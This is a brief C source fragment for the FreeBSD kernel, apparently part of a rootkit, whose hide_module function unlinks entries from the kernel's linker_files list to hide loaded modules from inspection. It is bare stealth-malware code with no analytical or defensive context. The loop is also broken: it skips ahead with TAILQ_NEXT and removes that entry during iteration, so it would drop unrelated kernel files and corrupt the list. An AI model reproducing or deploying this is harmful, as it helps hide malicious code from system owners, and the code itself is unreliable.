#include <sys/linker.h>
#include <sys/queue.h>

void hide_module(void) {
    struct linker_file *file;
    TAILQ_FOREACH(file, &linker_files, link) {
        file = TAILQ_NEXT(file, link);
        TAILQ_REMOVE(&linker_files, file, link);
    }
}
